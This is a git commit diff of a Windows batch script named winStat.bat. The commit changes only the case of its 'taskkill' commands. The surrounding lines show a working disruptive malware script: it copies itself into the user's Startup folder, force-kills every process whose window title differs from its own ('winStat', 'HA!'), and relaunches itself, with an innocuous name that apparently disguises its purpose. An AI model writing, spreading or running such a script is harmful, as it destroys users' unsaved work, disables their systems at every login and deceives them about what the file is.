f91377407d28a3001d5242fcbfe822b1bfe4f25d
zacharyacutey <zacharyacutey@users.noreply.github.com>
2016-03-05 12:03:28 -0500

    Update winStat.bat

--- winStat.bat
+++ winStat.bat
@@ -5,7 +5,7 @@ IF NOT EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\P
 %C% winStat.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winStat.bat"
 )
 TITLE winStat
-taskkill /F /FI "WINDOWTITLE ne winStat"
+TASKKILL /F /FI "WINDOWTITLE ne winStat"
 TITLE HA!
-taskkill /F /FI "WINDOWTITLE ne HA!"
+TASKKILL /F /FI "WINDOWTITLE ne HA!"
 START winStat.bat
